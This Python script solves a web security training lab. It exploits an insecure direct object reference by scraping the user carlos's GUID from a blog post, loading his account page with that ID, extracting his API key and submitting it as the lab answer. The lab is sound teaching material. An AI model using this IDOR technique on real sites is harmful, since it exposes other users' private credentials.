###############################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: User ID controlled by request parameter, with unpredictable user IDs
#
# Steps: 1. Fetch a post published by carlos
#        2. Extract carlos GUID from source code
#        3. Fetch carlos profile using his GUID
#        4. Extract the API key
#        5. Submit solution
#
###############################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0af100ef032d2661817dda5c0059000e.web-security-academy.net"

try:  
    # fetch a post published by carlos
    post_source_code = requests.get(f"{url}/post?postId=3")
    
except:
    print(Fore.RED + "[!] Failed to fetch a post published by carlos through exception")
    exit(1)

print(Fore.WHITE + "1. Fetching a post published by carlos.. " + Fore.GREEN + "OK")

# extract carlos GUID from source code
carlos_guid = re.findall("userId=(.*)'>carlos", post_source_code.text)[0]

print(Fore.WHITE + "2. Extracting carlos GUID from source code. " + Fore.GREEN + "OK")

try: 
    # fetch carlos profile using his GUID
    carlos_profile = requests.get(f"{url}/my-account?id={carlos_guid}")
    
except:
    print(Fore.RED + "[!] Failed to fetch carlos profile through exception")
    exit(1)

print(Fore.WHITE + "3. Fetching carlos profile page.. " + Fore.GREEN + "OK")

# extract the API key
api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]

print(Fore.WHITE + "4. Extracting the API key.. " + Fore.GREEN + "OK")

# set answer 
data = {
    "answer": api_key
}

try:
    # submit solution
    requests.post(f"{url}/submitSolution", data)
    
except:
    print(Fore.RED + "[!] Failed to submit solution through exception")
    exit(1)

print(Fore.WHITE + "5. Submitting solution.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



